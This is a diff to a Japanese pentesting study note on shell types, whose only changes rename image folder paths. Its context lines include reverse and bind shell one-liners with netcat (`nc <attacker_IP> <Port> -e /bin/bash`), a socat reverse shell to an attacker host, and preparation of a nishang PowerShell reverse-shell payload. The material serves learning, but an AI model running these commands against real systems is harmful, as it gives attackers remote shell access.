@@ -20,7 +20,7 @@
  * ユーザーの入力を常に待ち受け、実行結果が即座に返ってくる対話型
  * プロンプト（`$` や `#`）が表示され、タブ補完や履歴機能、ジョブコントロールが利用可能
  
- ![](../../画像ファイル/Pasted%20image%2020230318182041.png)
+ ![](../../Images/Pasted%20image%2020230318182041.png)
 
 $$インタラクティブシェルの出力例$$
 
@@ -31,7 +31,7 @@ $$インタラクティブシェルの出力例$$
  * ユーザーに入力を求めるプログラム（sshのパスワード入力、sudoのプロンプトなど）は、対話のための端末デバイスがないため実行できない
  * 下のキャプチャのように、引数だけで完結するwhoamiは問題なく実行できるが、対話的なセッションを必要とするsshは正常に動作しない
    
- ![](../../画像ファイル/Pasted%20image%2020230318182007.png)
+ ![](../../Images/Pasted%20image%2020230318182007.png)
 
 $$非インタラクティブシェルの出力例$$
 
@@ -54,7 +54,7 @@ nc -lvnp <Port> -e "cmd.exe"
 nc <target_IP> <Port>
 ```
 
-![ 900](../../画像ファイル/Pasted%20image%2020230318180927.png)
+![ 900](../../Images/Pasted%20image%2020230318180927.png)
 
 $$左が攻撃側、右がターゲット側$$
 
@@ -77,7 +77,7 @@ sudo rlwrap nc -lvnp <Port>
 nc <attacker_IP> <Port> -e /bin/bash
 ```
 
-![](../../画像ファイル/Pasted%20image%2020230318180351.png)
+![](../../Images/Pasted%20image%2020230318180351.png)
 
 $$左が攻撃側、右がターゲット側$$
 
@@ -377,7 +377,7 @@ socat TCP:<attacker_IP>:<Port> EXEC: "bash -li",pty,stderr,sigint,setsid,sane
 - `setsid`： 新しいセッションでプロセスを作成する
 - `sane`：端末を安定させる
 
-![ 800](../../画像ファイル/Pasted%20image%2020230319131940.png)
+![ 800](../../Images/Pasted%20image%2020230319131940.png)
 
 $$Socatによる安定化実例$$
 
@@ -440,7 +440,7 @@ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
 subl Invoke-PowerShellTcpOneLine.ps1
 ```
 
-![](../../画像ファイル/Pasted%20image%2020251107074119.png)
+![](../../Images/Pasted%20image%2020251107074119.png)
 
 $$ペイロードは赤枠部分を使う($smは圧縮版）$$
 
